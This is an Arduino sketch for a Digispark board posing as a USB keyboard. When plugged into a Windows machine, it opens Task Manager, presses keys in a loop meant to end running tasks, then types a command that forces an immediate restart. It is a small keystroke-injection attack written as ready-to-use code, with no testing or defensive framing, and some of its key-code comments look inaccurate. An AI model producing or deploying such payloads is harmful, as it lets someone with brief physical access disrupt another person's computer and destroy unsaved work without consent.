#include "DigiKeyboard.h"

void setup() {
  // Empty setup
}

void loop() {
  // Wait for a short period to ensure the system is ready
  DigiKeyboard.delay(3000);

  // Open Task Manager
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Open Run dialog
  DigiKeyboard.delay(500);
  DigiKeyboard.print("taskmgr"); // Task Manager command
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000); // Wait for Task Manager to open

  // Close tasks (basic approach, will not handle all cases)
  for (int i = 0; i < 10; i++) { // Attempt to close up to 10 tasks
    DigiKeyboard.sendKeyStroke(0x50); // Send 'DOWN' arrow key code (0x50 = VK_DOWN)
    DigiKeyboard.delay(500); // Wait for the selection to change
    DigiKeyboard.sendKeyStroke(0x09); // Send 'TAB' key code (0x09 = VK_TAB)
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER); // End the selected task
    DigiKeyboard.delay(1000); // Wait for the task to close
  }

  // Open the Run dialog again
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Open Run dialog
  DigiKeyboard.delay(500);
  DigiKeyboard.print("shutdown /r /t 0"); // Command to restart Windows immediately
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // To avoid repeating, keep the Digispark idle
  while (1) {
    // Do nothing
  }
}
